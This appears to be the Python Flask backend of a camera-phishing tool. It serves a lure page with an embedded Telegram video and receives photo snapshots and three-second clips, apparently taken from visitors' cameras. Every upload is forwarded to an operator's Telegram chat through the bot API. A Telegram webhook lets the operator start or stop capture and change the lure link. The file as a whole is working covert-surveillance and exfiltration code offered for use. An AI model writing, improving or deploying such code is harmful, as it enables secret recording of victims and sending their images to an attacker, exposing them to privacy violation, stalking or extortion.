import os
import requests
from flask import Flask, send_file, request, jsonify

app = Flask(__name__)

# ===== RENDER ENV VARIABLES =====
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
RENDER_URL = os.environ.get("RENDER_URL")

# Global Controls
current_video_url = "https://t.me/blackvaltofficial/8?embed=1&autoplay=1"
is_capturing = True  # Admin toggle

@app.route("/")
def home():
    return send_file("index.html")

@app.route("/get_video_link")
def get_video_link():
    return jsonify({"url": current_video_url, "status": is_capturing})

@app.route("/upload", methods=["POST"])
def upload():
    if not is_capturing: return "Stopped", 200
    if "photo" in request.files:
        photo = request.files["photo"]
        photo.save("temp.jpg")
        with open("temp.jpg", "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
                          files={"photo": f}, data={"chat_id": CHAT_ID, "caption": "📸 Snapshot"})
    return "OK", 200

@app.route("/upload_video", methods=["POST"])
def upload_video():
    if not is_capturing: return "Stopped", 200
    if "video" in request.files:
        vid = request.files["video"]
        vid.save("temp.mp4")
        with open("temp.mp4", "rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo", 
                          files={"video": f}, data={"chat_id": CHAT_ID, "caption": "🎥 3-Sec Clip"})
    return "OK", 200

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def webhook():
    global current_video_url, is_capturing
    data = request.get_json()
    if "message" in data:
        cid = str(data["message"]["chat"]["id"])
        text = data["message"].get("text", "")
        if cid == CHAT_ID:
            if text == "/start_capture":
                is_capturing = True
                msg = "✅ Capture Started (Photo + Video)"
            elif text == "/stop_capture":
                is_capturing = False
                msg = "🚫 Capture Stopped"
            elif "http" in text:
                current_video_url = text + ("?embed=1&autoplay=1" if "embed=1" not in text else "")
                msg = "✅ Video Link Updated"
            else: return "OK"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": cid, "text": msg})
    return "OK"

def init():
    if BOT_TOKEN and RENDER_URL:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={RENDER_URL}/{BOT_TOKEN}")

if __name__ == "__main__":
    init()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
